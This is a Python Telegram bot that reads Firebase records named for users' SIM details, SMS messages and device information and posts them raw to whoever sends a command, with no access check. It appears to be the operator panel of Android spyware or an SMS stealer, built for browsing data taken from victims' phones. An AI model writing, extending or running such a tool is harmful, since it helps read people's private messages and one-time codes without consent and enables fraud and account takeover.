import telebot
import os
import random
from dotenv import load_dotenv
from firebase import read_data

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(TOKEN)


@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(
        message,
        "🤖 Firebase Bot\n\n"
        "/sim - SIM Details\n"
        "/info - Device Info\n"
        "/sms - SMS Data\n"
        "/device DEVICE_ID - Device Info"
    )


@bot.message_handler(commands=["sim"])
def sim(message):
    data = read_data("All_Users/simDetails")

    if not data:
        bot.reply_to(message, "❌ No data found")
        return

    bot.reply_to(message, str(data)[:4000])


@bot.message_handler(commands=["info"])
def info(message):
    data = read_data("All_Users/Data/DeviceInfo")

    if not data:
        bot.reply_to(message, "❌ No device info")
        return

    bot.reply_to(message, str(data)[:4000])


@bot.message_handler(commands=["sms"])
def sms(message):
    data = read_data("All_Users/sms")

    if not data:
        bot.reply_to(message, "❌ No SMS found")
        return

    bot.reply_to(message, str(data)[:4000])


@bot.message_handler(commands=["device"])
def device(message):
    args = message.text.split()

    if len(args) != 2:
        bot.reply_to(message, "Usage:\n/device DEVICE_ID")
        return

    device_id = args[1]

    data = read_data(f"All_Users/Data/DeviceInfo/{device_id}")

    if not data:
        bot.reply_to(message, "❌ Device not found")
        return

    bot.reply_to(message, str(data)[:4000])


print("Bot Started...")
bot.infinity_polling()
